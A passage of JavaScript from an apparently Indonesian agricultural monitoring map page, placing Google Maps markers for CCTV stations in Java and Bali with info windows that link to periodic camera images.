                , content: "<div id='infoWindowAdmin_cctv'><b>Nama CCTV :</b> <a href='grid_cctv.aspx?id_cctv=20' target='_blank'>Petarukan </a><br> <b>Kec. :</b> Petarukan, <b>Kab. :</b> Pemalang,<br> <b>PROV. Jawa Tengah</b> :: <a href='https://maps.google.com/maps?t=h&q=-6.89645,109.4596&hl=id&z=18' target='_blank'>Lokasi CCTV</a><br>Gambar Baru: Sun, 24 December 2017<br><a href=nama_file_gif.aspx?nama='pantauan/web/balitklimat/CCTV20/periodic/balitklimat_CCTV20_terbaru.jpg' target='_blank'><img src='pantauan/web/balitklimat/CCTV20/periodic/balitklimat_CCTV20_terbaru.jpg' alt='Sun, 24 December 2017' height='177' width='224'  border='0'></a><br> <a href=nama_file_gif.aspx?nama='pantauan/web/balitklimat/CCTV20/periodic/balitklimat_CCTV20_awal_akhir.gif' target='_blank'>SEMUA</a> ::<a href=nama_file_gif.aspx?nama='pantauan/web/balitklimat/CCTV20/periodic/balitklimat_CCTV20_2017.gif' target='_blank'>2017</a> :: <a href=nama_file_gif.aspx?nama='pantauan/web/balitklimat/CCTV20/periodic/balitklimat_CCTV20_2017_12.gif' target='_blank'>Dec</a> :: <br><a href='nama_file_gif.aspx?nama=pantauan/web/balitklimat/CCTV20/periodic/balitklimat_CCTV20_2017_12_D1.gif' target='_blank'>Dec I</a> :: <a href=nama_file_gif.aspx?nama='pantauan/web/balitklimat/CCTV20/periodic/balitklimat_CCTV20_2017_12_D2.gif' target='_blank'>Dec II</a> :: <a href=nama_file_gif.aspx?nama='pantauan/web/balitklimat/CCTV20/periodic/balitklimat_CCTV20_2017_12_D3.gif' target='_blank'>Dec III</a></div>"
            });
            makeMarker_cctv({
                position: new google.maps.LatLng(-6.96976, 109.09492)
                , icon: image_cctv
                , shadow: shadow_cctv
                , title: "Dukuhwaru"
                , content: "<div id='infoWindowAdmin_cctv'><b>Nama CCTV :</b> <a href='grid_cctv.aspx?id_cctv=8' target='_blank'>Dukuhwaru </a><br> <b>Kec. :</b> Dukuh Waru, <b>Kab. :</b> Tegal,<br> <b>PROV. Jawa Tengah</b> :: <a href='https://maps.google.com/maps?t=h&q=-6.96976,109.09492&hl=id&z=18' target='_blank'>Lokasi CCTV</a><br>Gambar Baru: Sun, 29 April 2018<br><a href=nama_file_gif.aspx?nama='pantauan/web/balitklimat/CCTV08/periodic/balitklimat_CCTV08_terbaru.jpg' target='_blank'><img src='pantauan/web/balitklimat/CCTV08/periodic/balitklimat_CCTV08_terbaru.jpg' alt='Sun, 29 April 2018' height='177' width='224'  border='0'></a><br> <a href=nama_file_gif.aspx?nama='pantauan/web/balitklimat/CCTV08/periodic/balitklimat_CCTV08_awal_akhir.gif' target='_blank'>SEMUA</a> ::<a href=nama_file_gif.aspx?nama='pantauan/web/balitklimat/CCTV08/periodic/balitklimat_CCTV08_2018.gif' target='_blank'>2018</a> :: <a href=nama_file_gif.aspx?nama='pantauan/web/balitklimat/CCTV08/periodic/balitklimat_CCTV08_2018_04.gif' target='_blank'>Apr</a> :: <br><a href='nama_file_gif.aspx?nama=pantauan/web/balitklimat/CCTV08/periodic/balitklimat_CCTV08_2018_04_D1.gif' target='_blank'>Apr I</a> :: <a href=nama_file_gif.aspx?nama='pantauan/web/balitklimat/CCTV08/periodic/balitklimat_CCTV08_2018_04_D2.gif' target='_blank'>Apr II</a> :: <a href=nama_file_gif.aspx?nama='pantauan/web/balitklimat/CCTV08/periodic/balitklimat_CCTV08_2018_04_D3.gif' target='_blank'>Apr III</a></div>"
            });
            makeMarker_cctv({
                position: new google.maps.LatLng(-6.99894, 109.01736)
                , icon: image_cctv
                , shadow: shadow_cctv
                , title: "Songgom"
                , content: "<div id='infoWindowAdmin_cctv'><b>Nama CCTV :</b> <a href='grid_cctv.aspx?id_cctv=7' target='_blank'>Songgom </a><br> <b>Kec. :</b> Songgom, <b>Kab. :</b> Brebes,<br> <b>PROV. Jawa Tengah</b> :: <a href='https://maps.google.com/maps?t=h&q=-6.99894,109.01736&hl=id&z=18' target='_blank'>Lokasi CCTV</a><br>Gambar Baru: Tue, 30 January 2018<br><a href=nama_file_gif.aspx?nama='pantauan/web/balitklimat/CCTV07/periodic/balitklimat_CCTV07_terbaru.jpg' target='_blank'><img src='pantauan/web/balitklimat/CCTV07/periodic/balitklimat_CCTV07_terbaru.jpg' alt='Tue, 30 January 2018' height='177' width='224'  border='0'></a><br> <a href=nama_file_gif.aspx?nama='pantauan/web/balitklimat/CCTV07/periodic/balitklimat_CCTV07_awal_akhir.gif' target='_blank'>SEMUA</a> ::<a href=nama_file_gif.aspx?nama='pantauan/web/balitklimat/CCTV07/periodic/balitklimat_CCTV07_2018.gif' target='_blank'>2018</a> :: <a href=nama_file_gif.aspx?nama='pantauan/web/balitklimat/CCTV07/periodic/balitklimat_CCTV07_2018_01.gif' target='_blank'>Jan</a> :: <br><a href='nama_file_gif.aspx?nama=pantauan/web/balitklimat/CCTV07/periodic/balitklimat_CCTV07_2018_01_D1.gif' target='_blank'>Jan I</a> :: <a href=nama_file_gif.aspx?nama='pantauan/web/balitklimat/CCTV07/periodic/balitklimat_CCTV07_2018_01_D2.gif' target='_blank'>Jan II</a> :: <a href=nama_file_gif.aspx?nama='pantauan/web/balitklimat/CCTV07/periodic/balitklimat_CCTV07_2018_01_D3.gif' target='_blank'>Jan III</a></div>"
            });
            makeMarker_cctv({
                position: new google.maps.LatLng(-7.891701, 110.120255)
                , icon: image_cctv
                , shadow: shadow_cctv
                , title: "Wates"
                , content: "<div id='infoWindowAdmin_cctv'><b>Nama CCTV :</b> <a href='grid_cctv.aspx?id_cctv=31' target='_blank'>Wates </a><br> <b>Kec. :</b> Wates, <b>Kab. :</b> Kulon Progo,<br> <b>PROV. Daerah Istimewa Yogyakarta</b> :: <a href='https://maps.google.com/maps?t=h&q=-7.891701,110.120255&hl=id&z=18' target='_blank'>Lokasi CCTV</a><br>Gambar Baru: Sun, 16 September 2018<br><a href=nama_file_gif.aspx?nama='pantauan/web/balitklimat/CCTV31/periodic/balitklimat_CCTV31_terbaru.jpg' target='_blank'><img src='pantauan/web/balitklimat/CCTV31/periodic/balitklimat_CCTV31_terbaru.jpg' alt='Sun, 16 September 2018' height='177' width='224'  border='0'></a><br> <a href=nama_file_gif.aspx?nama='pantauan/web/balitklimat/CCTV31/periodic/balitklimat_CCTV31_awal_akhir.gif' target='_blank'>SEMUA</a> ::<a href=nama_file_gif.aspx?nama='pantauan/web/balitklimat/CCTV31/periodic/balitklimat_CCTV31_2018.gif' target='_blank'>2018</a> :: <a href=nama_file_gif.aspx?nama='pantauan/web/balitklimat/CCTV31/periodic/balitklimat_CCTV31_2018_09.gif' target='_blank'>Sep</a> :: <br><a href='nama_file_gif.aspx?nama=pantauan/web/balitklimat/CCTV31/periodic/balitklimat_CCTV31_2018_09_D1.gif' target='_blank'>Sep I</a> :: <a href=nama_file_gif.aspx?nama='pantauan/web/balitklimat/CCTV31/periodic/balitklimat_CCTV31_2018_09_D2.gif' target='_blank'>Sep II</a> :: <a href=nama_file_gif.aspx?nama='pantauan/web/balitklimat/CCTV31/periodic/balitklimat_CCTV31_2018_09_D3.gif' target='_blank'>Sep III</a></div>"
            });
            makeMarker_cctv({
                position: new google.maps.LatLng(-7.742206, 110.204971)
                , icon: image_cctv
                , shadow: shadow_cctv
                , title: "Nanggulan"
                , content: "<div id='infoWindowAdmin_cctv'><b>Nama CCTV :</b> <a href='grid_cctv.aspx?id_cctv=30' target='_blank'>Nanggulan </a><br> <b>Kec. :</b> Nanggulan, <b>Kab. :</b> Kulon Progo,<br> <b>PROV. Daerah Istimewa Yogyakarta</b> :: <a href='https://maps.google.com/maps?t=h&q=-7.742206,110.204971&hl=id&z=18' target='_blank'>Lokasi CCTV</a><br>Gambar Baru: Thu, 15 December 2016<br><a href=nama_file_gif.aspx?nama='pantauan/web/balitklimat/CCTV30/periodic/balitklimat_CCTV30_terbaru.jpg' target='_blank'><img src='pantauan/web/balitklimat/CCTV30/periodic/balitklimat_CCTV30_terbaru.jpg' alt='Thu, 15 December 2016' height='177' width='224'  border='0'></a><br> <a href=nama_file_gif.aspx?nama='pantauan/web/balitklimat/CCTV30/periodic/balitklimat_CCTV30_awal_akhir.gif' target='_blank'>SEMUA</a> ::<a href=nama_file_gif.aspx?nama='pantauan/web/balitklimat/CCTV30/periodic/balitklimat_CCTV30_2016.gif' target='_blank'>2016</a> :: <a href=nama_file_gif.aspx?nama='pantauan/web/balitklimat/CCTV30/periodic/balitklimat_CCTV30_2016_12.gif' target='_blank'>Dec</a> :: <br><a href='nama_file_gif.aspx?nama=pantauan/web/balitklimat/CCTV30/periodic/balitklimat_CCTV30_2016_12_D1.gif' target='_blank'>Dec I</a> :: <a href=nama_file_gif.aspx?nama='pantauan/web/balitklimat/CCTV30/periodic/balitklimat_CCTV30_2016_12_D2.gif' target='_blank'>Dec II</a> :: <a href=nama_file_gif.aspx?nama='pantauan/web/balitklimat/CCTV30/periodic/balitklimat_CCTV30_2016_12_D3.gif' target='_blank'>Dec III</a></div>"
            });
            makeMarker_cctv({
                position: new google.maps.LatLng(-6.3747673, 107.8795776)
                , icon: image_cctv
                , shadow: shadow_cctv
                , title: "Compreng"
                , content: "<div id='infoWindowAdmin_cctv'><b>Nama CCTV :</b> <a href='grid_cctv.aspx?id_cctv=54' target='_blank'>Compreng </a><br> <b>Kec. :</b> Compreng, <b>Kab. :</b> Subang,<br> <b>PROV. Jabar</b> :: <a href='https://maps.google.com/maps?t=h&q=-6.3747673,107.8795776&hl=id&z=18' target='_blank'>Lokasi CCTV</a><br>Gambar Baru: Sat, 17 August 2019<br><a href=nama_file_gif.aspx?nama='pantauan/web/balitklimat/CCTV54/periodic/balitklimat_CCTV54_terbaru.jpg' target='_blank'><img src='pantauan/web/balitklimat/CCTV54/periodic/balitklimat_CCTV54_terbaru.jpg' alt='Sat, 17 August 2019' height='177' width='224'  border='0'></a><br> <a href=nama_file_gif.aspx?nama='pantauan/web/balitklimat/CCTV54/periodic/balitklimat_CCTV54_awal_akhir.gif' target='_blank'>SEMUA</a> ::<a href=nama_file_gif.aspx?nama='pantauan/web/balitklimat/CCTV54/periodic/balitklimat_CCTV54_2019.gif' target='_blank'>2019</a> :: <a href=nama_file_gif.aspx?nama='pantauan/web/balitklimat/CCTV54/periodic/balitklimat_CCTV54_2019_08.gif' target='_blank'>Aug</a> :: <br><a href='nama_file_gif.aspx?nama=pantauan/web/balitklimat/CCTV54/periodic/balitklimat_CCTV54_2019_08_D1.gif' target='_blank'>Aug I</a> :: <a href=nama_file_gif.aspx?nama='pantauan/web/balitklimat/CCTV54/periodic/balitklimat_CCTV54_2019_08_D2.gif' target='_blank'>Aug II</a> :: <a href=nama_file_gif.aspx?nama='pantauan/web/balitklimat/CCTV54/periodic/balitklimat_CCTV54_2019_08_D3.gif' target='_blank'>Aug III</a></div>"
            });
            makeMarker_cctv({
                position: new google.maps.LatLng(-7.66415, 109.26797)
                , icon: image_cctv
                , shadow: shadow_cctv
                , title: "Binangun"
                , content: "<div id='infoWindowAdmin_cctv'><b>Nama CCTV :</b> <a href='grid_cctv.aspx?id_cctv=22' target='_blank'>Binangun </a><br> <b>Kec. :</b> Binangun, <b>Kab. :</b> Cilacap,<br> <b>PROV. Jawa Tengah</b> :: <a href='https://maps.google.com/maps?t=h&q=-7.66415,109.26797&hl=id&z=18' target='_blank'>Lokasi CCTV</a><br>Gambar Baru: Mon, 23 April 2018<br><a href=nama_file_gif.aspx?nama='pantauan/web/balitklimat/CCTV22/periodic/balitklimat_CCTV22_terbaru.jpg' target='_blank'><img src='pantauan/web/balitklimat/CCTV22/periodic/balitklimat_CCTV22_terbaru.jpg' alt='Mon, 23 April 2018' height='177' width='224'  border='0'></a><br> <a href=nama_file_gif.aspx?nama='pantauan/web/balitklimat/CCTV22/periodic/balitklimat_CCTV22_awal_akhir.gif' target='_blank'>SEMUA</a> ::<a href=nama_file_gif.aspx?nama='pantauan/web/balitklimat/CCTV22/periodic/balitklimat_CCTV22_2018.gif' target='_blank'>2018</a> :: <a href=nama_file_gif.aspx?nama='pantauan/web/balitklimat/CCTV22/periodic/balitklimat_CCTV22_2018_04.gif' target='_blank'>Apr</a> :: <br><a href='nama_file_gif.aspx?nama=pantauan/web/balitklimat/CCTV22/periodic/balitklimat_CCTV22_2018_04_D1.gif' target='_blank'>Apr I</a> :: <a href=nama_file_gif.aspx?nama='pantauan/web/balitklimat/CCTV22/periodic/balitklimat_CCTV22_2018_04_D2.gif' target='_blank'>Apr II</a> :: <a href=nama_file_gif.aspx?nama='pantauan/web/balitklimat/CCTV22/periodic/balitklimat_CCTV22_2018_04_D3.gif' target='_blank'>Apr III</a></div>"
            });
            makeMarker_cctv({
                position: new google.maps.LatLng(-7.637659, 110.808781)
                , icon: image_cctv
                , shadow: shadow_cctv
                , title: "Grogol"
                , content: "<div id='infoWindowAdmin_cctv'><b>Nama CCTV :</b> <a href='grid_cctv.aspx?id_cctv=26' target='_blank'>Grogol </a><br> <b>Kec. :</b> Grogol, <b>Kab. :</b> Sukoharjo,<br> <b>PROV. Jawa Tengah</b> :: <a href='https://maps.google.com/maps?t=h&q=-7.637659,110.808781&hl=id&z=18' target='_blank'>Lokasi CCTV</a><br>Gambar Baru: Sat, 24 June 2017<br><a href=nama_file_gif.aspx?nama='pantauan/web/balitklimat/CCTV26/periodic/balitklimat_CCTV26_terbaru.jpg' target='_blank'><img src='pantauan/web/balitklimat/CCTV26/periodic/balitklimat_CCTV26_terbaru.jpg' alt='Sat, 24 June 2017' height='177' width='224'  border='0'></a><br> <a href=nama_file_gif.aspx?nama='pantauan/web/balitklimat/CCTV26/periodic/balitklimat_CCTV26_awal_akhir.gif' target='_blank'>SEMUA</a> ::<a href=nama_file_gif.aspx?nama='pantauan/web/balitklimat/CCTV26/periodic/balitklimat_CCTV26_2017.gif' target='_blank'>2017</a> :: <a href=nama_file_gif.aspx?nama='pantauan/web/balitklimat/CCTV26/periodic/balitklimat_CCTV26_2017_06.gif' target='_blank'>Jun</a> :: <br><a href='nama_file_gif.aspx?nama=pantauan/web/balitklimat/CCTV26/periodic/balitklimat_CCTV26_2017_06_D1.gif' target='_blank'>Jun I</a> :: <a href=nama_file_gif.aspx?nama='pantauan/web/balitklimat/CCTV26/periodic/balitklimat_CCTV26_2017_06_D2.gif' target='_blank'>Jun II</a> :: <a href=nama_file_gif.aspx?nama='pantauan/web/balitklimat/CCTV26/periodic/balitklimat_CCTV26_2017_06_D3.gif' target='_blank'>Jun III</a></div>"
            });
            makeMarker_cctv({
                position: new google.maps.LatLng(-7.435961, 110.977272)
                , icon: image_cctv
                , shadow: shadow_cctv
                , title: "Sidoharjo"
                , content: "<div id='infoWindowAdmin_cctv'><b>Nama CCTV :</b> <a href='grid_cctv.aspx?id_cctv=17' target='_blank'>Sidoharjo </a><br> <b>Kec. :</b> Sidoharjo, <b>Kab. :</b> Sragen,<br> <b>PROV. Jawa Tengah</b> :: <a href='https://maps.google.com/maps?t=h&q=-7.435961,110.977272&hl=id&z=18' target='_blank'>Lokasi CCTV</a><br>Gambar Baru: Tue, 03 July 2018<br><a href=nama_file_gif.aspx?nama='pantauan/web/balitklimat/CCTV17/periodic/balitklimat_CCTV17_terbaru.jpg' target='_blank'><img src='pantauan/web/balitklimat/CCTV17/periodic/balitklimat_CCTV17_terbaru.jpg' alt='Tue, 03 July 2018' height='177' width='224'  border='0'></a><br> <a href=nama_file_gif.aspx?nama='pantauan/web/balitklimat/CCTV17/periodic/balitklimat_CCTV17_awal_akhir.gif' target='_blank'>SEMUA</a> ::<a href=nama_file_gif.aspx?nama='pantauan/web/balitklimat/CCTV17/periodic/balitklimat_CCTV17_2018.gif' target='_blank'>2018</a> :: <a href=nama_file_gif.aspx?nama='pantauan/web/balitklimat/CCTV17/periodic/balitklimat_CCTV17_2018_07.gif' target='_blank'>Jul</a> :: <br><a href='nama_file_gif.aspx?nama=pantauan/web/balitklimat/CCTV17/periodic/balitklimat_CCTV17_2018_07_D1.gif' target='_blank'>Jul I</a> :: <a href=nama_file_gif.aspx?nama='pantauan/web/balitklimat/CCTV17/periodic/balitklimat_CCTV17_2018_07_D2.gif' target='_blank'>Jul II</a> :: <a href=nama_file_gif.aspx?nama='pantauan/web/balitklimat/CCTV17/periodic/balitklimat_CCTV17_2018_07_D3.gif' target='_blank'>Jul III</a></div>"
            });
            makeMarker_cctv({
                position: new google.maps.LatLng(-7.024819, 110.757754)
                , icon: image_cctv
                , shadow: shadow_cctv
                , title: "Godong"
                , content: "<div id='infoWindowAdmin_cctv'><b>Nama CCTV :</b> <a href='grid_cctv.aspx?id_cctv=18' target='_blank'>Godong </a><br> <b>Kec. :</b> Godong, <b>Kab. :</b> Purwodadi,<br> <b>PROV. Jawa Tengah</b> :: <a href='https://maps.google.com/maps?t=h&q=-7.024819,110.757754&hl=id&z=18' target='_blank'>Lokasi CCTV</a><br>Gambar Baru: Tue, 27 September 2016<br><a href=nama_file_gif.aspx?nama='pantauan/web/balitklimat/CCTV18/periodic/balitklimat_CCTV18_terbaru.jpg' target='_blank'><img src='pantauan/web/balitklimat/CCTV18/periodic/balitklimat_CCTV18_terbaru.jpg' alt='Tue, 27 September 2016' height='177' width='224'  border='0'></a><br> <a href=nama_file_gif.aspx?nama='pantauan/web/balitklimat/CCTV18/periodic/balitklimat_CCTV18_awal_akhir.gif' target='_blank'>SEMUA</a> ::<a href=nama_file_gif.aspx?nama='pantauan/web/balitklimat/CCTV18/periodic/balitklimat_CCTV18_2016.gif' target='_blank'>2016</a> :: <a href=nama_file_gif.aspx?nama='pantauan/web/balitklimat/CCTV18/periodic/balitklimat_CCTV18_2016_09.gif' target='_blank'>Sep</a> :: <br><a href='nama_file_gif.aspx?nama=pantauan/web/balitklimat/CCTV18/periodic/balitklimat_CCTV18_2016_09_D1.gif' target='_blank'>Sep I</a> :: <a href=nama_file_gif.aspx?nama='pantauan/web/balitklimat/CCTV18/periodic/balitklimat_CCTV18_2016_09_D2.gif' target='_blank'>Sep II</a> :: <a href=nama_file_gif.aspx?nama='pantauan/web/balitklimat/CCTV18/periodic/balitklimat_CCTV18_2016_09_D3.gif' target='_blank'>Sep III</a></div>"
            });
            makeMarker_cctv({
                position: new google.maps.LatLng(-7.167052, 111.562841)
                , icon: image_cctv
                , shadow: shadow_cctv
                , title: "Cepu"
                , content: "<div id='infoWindowAdmin_cctv'><b>Nama CCTV :</b> <a href='grid_cctv.aspx?id_cctv=27' target='_blank'>Cepu </a><br> <b>Kec. :</b> Cepu, <b>Kab. :</b> Blora,<br> <b>PROV. Jawa Tengah</b> :: <a href='https://maps.google.com/maps?t=h&q=-7.167052,111.562841&hl=id&z=18' target='_blank'>Lokasi CCTV</a><br>Gambar Baru: Wed, 11 April 2018<br><a href=nama_file_gif.aspx?nama='pantauan/web/balitklimat/CCTV27/periodic/balitklimat_CCTV27_terbaru.jpg' target='_blank'><img src='pantauan/web/balitklimat/CCTV27/periodic/balitklimat_CCTV27_terbaru.jpg' alt='Wed, 11 April 2018' height='177' width='224'  border='0'></a><br> <a href=nama_file_gif.aspx?nama='pantauan/web/balitklimat/CCTV27/periodic/balitklimat_CCTV27_awal_akhir.gif' target='_blank'>SEMUA</a> ::<a href=nama_file_gif.aspx?nama='pantauan/web/balitklimat/CCTV27/periodic/balitklimat_CCTV27_2018.gif' target='_blank'>2018</a> :: <a href=nama_file_gif.aspx?nama='pantauan/web/balitklimat/CCTV27/periodic/balitklimat_CCTV27_2018_04.gif' target='_blank'>Apr</a> :: <br><a href='nama_file_gif.aspx?nama=pantauan/web/balitklimat/CCTV27/periodic/balitklimat_CCTV27_2018_04_D1.gif' target='_blank'>Apr I</a> :: <a href=nama_file_gif.aspx?nama='pantauan/web/balitklimat/CCTV27/periodic/balitklimat_CCTV27_2018_04_D2.gif' target='_blank'>Apr II</a> :: <a href=nama_file_gif.aspx?nama='pantauan/web/balitklimat/CCTV27/periodic/balitklimat_CCTV27_2018_04_D3.gif' target='_blank'>Apr III</a></div>"
            });
            makeMarker_cctv({
                position: new google.maps.LatLng(-8.37318235, 114.7195206)
                , icon: image_cctv
                , shadow: shadow_cctv
                , title: "Mendoyo"
                , content: "<div id='infoWindowAdmin_cctv'><b>Nama CCTV :</b> <a href='grid_cctv.aspx?id_cctv=1' target='_blank'>Mendoyo </a><br> <b>Kec. :</b> Mendoyo, <b>Kab. :</b> Jembrana,<br> <b>PROV. Bali</b> :: <a href='https://maps.google.com/maps?t=h&q=-8.37318235,114.7195206&hl=id&z=18' target='_blank'>Lokasi CCTV</a><br>Gambar Baru: Mon, 11 December 2017<br><a href=nama_file_gif.aspx?nama='pantauan/web/balitklimat/CCTV01/periodic/balitklimat_CCTV01_terbaru.jpg' target='_blank'><img src='pantauan/web/balitklimat/CCTV01/periodic/balitklimat_CCTV01_terbaru.jpg' alt='Mon, 11 December 2017' height='177' width='224'  border='0'></a><br> <a href=nama_file_gif.aspx?nama='pantauan/web/balitklimat/CCTV01/periodic/balitklimat_CCTV01_awal_akhir.gif' target='_blank'>SEMUA</a> ::<a href=nama_file_gif.aspx?nama='pantauan/web/balitklimat/CCTV01/periodic/balitklimat_CCTV01_2017.gif' target='_blank'>2017</a> :: <a href=nama_file_gif.aspx?nama='pantauan/web/balitklimat/CCTV01/periodic/balitklimat_CCTV01_2017_12.gif' target='_blank'>Dec</a> :: <br><a href='nama_file_gif.aspx?nama=pantauan/web/balitklimat/CCTV01/periodic/balitklimat_CCTV01_2017_12_D1.gif' target='_blank'>Dec I</a> :: <a href=nama_file_gif.aspx?nama='pantauan/web/balitklimat/CCTV01/periodic/balitklimat_CCTV01_2017_12_D2.gif' target='_blank'>Dec II</a> :: <a href=nama_file_gif.aspx?nama='pantauan/web/balitklimat/CCTV01/periodic/balitklimat_CCTV01_2017_12_D3.gif' target='_blank'>Dec III</a></div>"
            });
            makeMarker_cctv({
                position: new google.maps.LatLng(-8.5718918, 115.0666504)
                , icon: image_cctv
                , shadow: shadow_cctv
                , title: "Kerambitan"
                , content: "<div id='infoWindowAdmin_cctv'><b>Nama CCTV :</b> <a href='grid_cctv.aspx?id_cctv=11' target='_blank'>Kerambitan </a><br> <b>Kec. :</b> Kerambitan, <b>Kab. :</b> Tabanan,<br> <b>PROV. Bali</b> :: <a href='https://maps.google.com/maps?t=h&q=-8.5718918,115.0666504&hl=id&z=18' target='_blank'>Lokasi CCTV</a><br>Gambar Baru: Wed, 12 October 2016<br><a href=nama_file_gif.aspx?nama='pantauan/web/balitklimat/CCTV11/periodic/balitklimat_CCTV11_terbaru.jpg' target='_blank'><img src='pantauan/web/balitklimat/CCTV11/periodic/balitklimat_CCTV11_terbaru.jpg' alt='Wed, 12 October 2016' height='177' width='224'  border='0'></a><br> <a href=nama_file_gif.aspx?nama='pantauan/web/balitklimat/CCTV11/periodic/balitklimat_CCTV11_awal_akhir.gif' target='_blank'>SEMUA</a> ::<a href=nama_file_gif.aspx?nama='pantauan/web/balitklimat/CCTV11/periodic/balitklimat_CCTV11_2016.gif' target='_blank'>2016</a> :: <a href=nama_file_gif.aspx?nama='pantauan/web/balitklimat/CCTV11/periodic/balitklimat_CCTV11_2016_10.gif' target='_blank'>Oct</a> :: <br><a href='nama_file_gif.aspx?nama=pantauan/web/balitklimat/CCTV11/periodic/balitklimat_CCTV11_2016_10_D1.gif' target='_blank'>Oct I</a> :: <a href=nama_file_gif.aspx?nama='pantauan/web/balitklimat/CCTV11/periodic/balitklimat_CCTV11_2016_10_D2.gif' target='_blank'>Oct II</a> :: <a href=nama_file_gif.aspx?nama='pantauan/web/balitklimat/CCTV11/periodic/balitklimat_CCTV11_2016_10_D3.gif' target='_blank'>Oct III</a></div>"
            });
            makeMarker_cctv({
                position: new google.maps.LatLng(-8.495635, 115.1175513)
                , icon: image_cctv
                , shadow: shadow_cctv
                , title: "Marga"
                , content: "<div id='infoWindowAdmin_cctv'><b>Nama CCTV :</b> <a href='grid_cctv.aspx?id_cctv=29' target='_blank'>Marga </a><br> <b>Kec. :</b> Marga, <b>Kab. :</b> Tabanan,<br> <b>PROV. Bali</b> :: <a href='https://maps.google.com/maps?t=h&q=-8.495635,115.1175513&hl=id&z=18' target='_blank'>Lokasi CCTV</a><br>Gambar Baru: Sat, 22 December 2018<br><a href=nama_file_gif.aspx?nama='pantauan/web/balitklimat/CCTV29/periodic/balitklimat_CCTV29_terbaru.jpg' target='_blank'><img src='pantauan/web/balitklimat/CCTV29/periodic/balitklimat_CCTV29_terbaru.jpg' alt='Sat, 22 December 2018' height='177' width='224'  border='0'></a><br> <a href=nama_file_gif.aspx?nama='pantauan/web/balitklimat/CCTV29/periodic/balitklimat_CCTV29_awal_akhir.gif' target='_blank'>SEMUA</a> ::<a href=nama_file_gif.aspx?nama='pantauan/web/balitklimat/CCTV29/periodic/balitklimat_CCTV29_2018.gif' target='_blank'>2018</a> :: <a href=nama_file_gif.aspx?nama='pantauan/web/balitklimat/CCTV29/periodic/balitklimat_CCTV29_2018_12.gif' target='_blank'>Dec</a> :: <br><a href='nama_file_gif.aspx?nama=pantauan/web/balitklimat/CCTV29/periodic/balitklimat_CCTV29_2018_12_D1.gif' target='_blank'>Dec I</a> :: <a href=nama_file_gif.aspx?nama='pantauan/web/balitklimat/CCTV29/periodic/balitklimat_CCTV29_2018_12_D2.gif' target='_blank'>Dec II</a> :: <a href=nama_file_gif.aspx?nama='pantauan/web/balitklimat/CCTV29/periodic/balitklimat_CCTV29_2018_12_D3.gif' target='_blank'>Dec III</a></div>"
            });
            makeMarker_cctv({
                position: new google.maps.LatLng(-8.6070986, 115.301712)
                , icon: image_cctv
                , shadow: shadow_cctv
                , title: "Sukawati"
                , content: "<div id='infoWindowAdmin_cctv'><b>Nama CCTV :</b> <a href='grid_cctv.aspx?id_cctv=12' target='_blank'>Sukawati </a><br> <b>Kec. :</b> Sukawati, <b>Kab. :</b> Gianyar,<br> <b>PROV. Bali</b> :: <a href='https://maps.google.com/maps?t=h&q=-8.6070986,115.301712&hl=id&z=18' target='_blank'>Lokasi CCTV</a><br>Gambar Baru: Mon, 07 March 2016<br><a href=nama_file_gif.aspx?nama='pantauan/web/balitklimat/CCTV12/periodic/balitklimat_CCTV12_terbaru.jpg' target='_blank'><img src='pantauan/web/balitklimat/CCTV12/periodic/balitklimat_CCTV12_terbaru.jpg' alt='Mon, 07 March 2016' height='177' width='224'  border='0'></a><br> <a href=nama_file_gif.aspx?nama='pantauan/web/balitklimat/CCTV12/periodic/balitklimat_CCTV12_awal_akhir.gif' target='_blank'>SEMUA</a> ::<a href=nama_file_gif.aspx?nama='pantauan/web/balitklimat/CCTV12/periodic/balitklimat_CCTV12_2016.gif' target='_blank'>2016</a> :: <a href=nama_file_gif.aspx?nama='pantauan/web/balitklimat/CCTV12/periodic/balitklimat_CCTV12_2016_03.gif' target='_blank'>Mar</a> :: <br><a href='nama_file_gif.aspx?nama=pantauan/web/balitklimat/CCTV12/periodic/balitklimat_CCTV12_2016_03_D1.gif' target='_blank'>Mar I</a> :: <a href=nama_file_gif.aspx?nama='pantauan/web/balitklimat/CCTV12/periodic/balitklimat_CCTV12_2016_03_D2.gif' target='_blank'>Mar II</a> :: <a href=nama_file_gif.aspx?nama='pantauan/web/balitklimat/CCTV12/periodic/balitklimat_CCTV12_2016_03_D3.gif' target='_blank'>Mar III</a></div>"
            });
            makeMarker_cctv({
                position: new google.maps.LatLng(-8.5536375, 115.4476089)
                , icon: image_cctv
                , shadow: shadow_cctv
                , title: "Dawan"
                , content: "<div id='infoWindowAdmin_cctv'><b>Nama CCTV :</b> <a href='grid_cctv.aspx?id_cctv=21' target='_blank'>Dawan </a><br> <b>Kec. :</b> Dawan, <b>Kab. :</b> Klungkung,<br> <b>PROV. Bali</b> :: <a href='https://maps.google.com/maps?t=h&q=-8.5536375,115.4476089&hl=id&z=18' target='_blank'>Lokasi CCTV</a><br>Gambar Baru: Sun, 21 July 2019<br><a href=nama_file_gif.aspx?nama='pantauan/web/balitklimat/CCTV21/periodic/balitklimat_CCTV21_terbaru.jpg' target='_blank'><img src='pantauan/web/balitklimat/CCTV21/periodic/balitklimat_CCTV21_terbaru.jpg' alt='Sun, 21 July 2019' height='177' width='224'  border='0'></a><br> <a href=nama_file_gif.aspx?nama='pantauan/web/balitklimat/CCTV21/periodic/balitklimat_CCTV21_awal_akhir.gif' target='_blank'>SEMUA</a> ::<a href=nama_file_gif.aspx?nama='pantauan/web/balitklimat/CCTV21/periodic/balitklimat_CCTV21_2019.gif' target='_blank'>2019</a> :: <a href=nama_file_gif.aspx?nama='pantauan/web/balitklimat/CCTV21/periodic/balitklimat_CCTV21_2019_07.gif' target='_blank'>Jul</a> :: <br><a href='nama_file_gif.aspx?nama=pantauan/web/balitklimat/CCTV21/periodic/balitklimat_CCTV21_2019_07_D1.gif' target='_blank'>Jul I</a> :: <a href=nama_file_gif.aspx?nama='pantauan/web/balitklimat/CCTV21/periodic/balitklimat_CCTV21_2019_07_D2.gif' target='_blank'>Jul II</a> :: <a href=nama_file_gif.aspx?nama='pantauan/web/balitklimat/CCTV21/periodic/balitklimat_CCTV21_2019_07_D3.gif' target='_blank'>Jul III</a></div>"
            });
            var infowindow = null;
            var image = new google.maps.MarkerImage('http://katam.litbang.pertanian.go.id/markers/padi_hijau.png');
            var shadow = new google.maps.MarkerImage('http://katam.litbang.pertanian.go.id/markers/shadow.png');
            for (var i = 0; i < places.length; i++) {
                var marker = new google.maps.Marker({
                    position: places[i]
                    , map: map
                    , icon: image
                    , shadow: shadow
                    , title: 'PULAU ' + pulau[i]
                });
                (function(i, marker) {
                    google.maps.event.addListener(marker, 'click', function() {
                        var temp1 = i + ',0';
                        var temp2 = i + ',1';
